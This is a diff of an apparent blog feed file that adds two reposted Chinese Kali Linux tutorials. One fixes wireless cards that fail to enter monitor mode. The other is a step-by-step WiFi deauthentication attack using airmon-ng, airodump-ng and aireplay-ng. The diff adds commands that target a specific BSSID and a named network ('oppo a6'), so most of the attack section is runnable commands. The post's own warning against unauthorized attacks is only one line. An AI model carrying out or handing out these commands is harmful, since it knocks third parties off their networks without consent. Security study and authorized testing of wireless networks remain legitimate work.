@@ -4,11 +4,24 @@
   
     
     <entry>
+      <title>最新kali关于无线网卡监听失败扫描不到wifi的解决方法</title>
+      <link href="/posts/d6514208.html"/>
+      <url>/posts/d6514208.html</url>
+      
+        <content type="html"><![CDATA[<h1>方法一:</h1><p>将网卡拔掉换个插口，重启物理主机并重启虚拟机！</p><h1>方法二：</h1><p>输入命令检查进程并杀掉进程。</p><p>airmon-ng check<br>AI写代码<br>plaintext<br>airmon-ng check kill<br>AI写代码<br>plaintext</p><h1>方法三：</h1><p>需要执行命令先卸载网卡，再重新挂载，按顺序执行下面三条代码。</p><p>ifconfig wlan0 down<br>iwconfig wlan0 mode monitor<br>ifconfig wlan0 up<br>AI写代码<br>plaintext</p><h1>方法四：</h1><p>此网卡就是wlan0，不是wlan0mon。也不需要用airmon-ng start 命令启用监听模式，airodump-ng命令会自动处理开启监听。</p><p>sudo airodump-ng wlan0<br>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/weixin_74711824/article/details/128839356">https://blog.csdn.net/weixin_74711824/article/details/128839356</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>kaliWIFI断网攻击</title>
       <link href="/posts/74e17bb7.html"/>
       <url>/posts/74e17bb7.html</url>
       
-        <content type="html"><![CDATA[<p>1.准备免驱网卡，十几块钱嘎嘎板正</p><p>2.将网卡差在主机上（虚拟机需要选择连接在虚拟机上）主机会自动连接</p><p>3.检查网卡</p><p>sudo su</p><p>开启root模式 初始密码kali</p><p>ifconfig</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d358ad04f61cf4aea530c167119787d1.png" alt="d358ad04f61cf4aea530c167119787d1"></p><p>检查网卡 出现wlan0即为成功</p><p>3开启网卡的监听模式</p><p>airmon-ng start wlan0</p><p>名词解释</p><p>Bssid –无线路由的Mac地址</p><p>Pwr –附近wifi信号的强度</p><p>#Data 捕获到的数据包</p><p>CH –无线路由的信道</p><p>ESSID wifi名称</p><p>如图</p><p>4.开启网卡进行扫描</p><p>airodump-ng wlan0mon</p><p>如图</p><p>CTRL+C停止扫描</p><p>4.开启监听</p><p>airodump-ng --bssid (上面扫描到的bssid数值) -c（CH数值）–write qyyy wlan0mon</p><p>5.开始装X</p><p>aireplay-ng -a(上方bssid数值) -0 500 wlan0mon</p><p>注：Ctrl+C停止攻击</p><p>不要攻击未经允许的wifi，违法的！</p><p>别还没学多少kali，牢饭就吃饱了❤️<br>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p><p>原文链接：<a href="https://blog.csdn.net/maniubip/article/details/140434049">https://blog.csdn.net/maniubip/article/details/140434049</a></p>]]></content>
+        <content type="html"><![CDATA[<p>1.准备免驱网卡，十几块钱嘎嘎板正</p><p>2.将网卡差在主机上（虚拟机需要选择连接在虚拟机上）主机会自动连接</p><p>3.检查网卡</p><p>sudo su</p><p>开启root模式 初始密码kali</p><p>ifconfig</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d358ad04f61cf4aea530c167119787d1.png" alt="d358ad04f61cf4aea530c167119787d1"></p><p>检查网卡 出现wlan0即为成功</p><p>3开启网卡的监听模式</p><p>airmon-ng start wlan0</p><p>名词解释</p><p>Bssid –无线路由的Mac地址</p><p>Pwr –附近wifi信号的强度</p><p>#Data 捕获到的数据包</p><p>CH –无线路由的信道</p><p>ESSID wifi名称</p><p>如图</p><p>4.开启网卡进行扫描</p><p>airodump-ng wlan0mon</p><p>如图</p><p>CTRL+C停止扫描</p><p>4.开启监听</p><p>airodump-ng --bssid (上面扫描到的bssid数值) -c（CH数值）–write qyyy wlan0mon</p><p>5.开始装X</p><p>aireplay-ng -a(上方bssid数值) -0 500 wlan0mon</p><p>注：Ctrl+C停止攻击</p><p>不要攻击未经允许的wifi，违法的！<br># 重新运行 airodump-ng，专注于频道 6 并观察目标 BSSID 是否存在<br>airodump-ng -c 6 wlan0mon</p><ol><li><p>命令 iwconfig wlan0mon channel 11<br>作用：将无线网卡（wlan0mon）强制锁定到频道 11<br>各部分含义：<br>iwconfig：Linux 系统中用于配置无线网卡参数的命令<br>wlan0mon：处于监控模式（monitor mode）的无线网卡接口名<br>channel 11：指定要锁定的频道为 11（与目标 WiFi 的频道一致）</p></li><li><p>命令 aireplay-ng -a 76:CE:C0:86:FC:EC  -0 500 wlan0mon<br>作用：向目标 WiFi 发送大量断开连接帧，使连接的设备暂时掉线<br>各参数含义：<br>aireplay-ng：用于无线数据包注入和攻击的工具<br>-a 52:AD:3E:6D:98:CC：指定目标 WiFi 的 BSSID（MAC 地址）<br>-0 500：表示发起 Deauthentication 攻击（-0是攻击模式），发送 500 个断开帧<br>wlan0mon：使用该监控模式网卡进行攻击</p></li></ol><p>{<br>airodump-ng --essid “oppo a6” wlan0mon    扫面固定的wifi名<br>}<br>别还没学多少kali，牢饭就吃饱了❤️<br>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p><p>原文链接：<a href="https://blog.csdn.net/maniubip/article/details/140434049">https://blog.csdn.net/maniubip/article/details/140434049</a></p>]]></content>
       
       
       <categories>
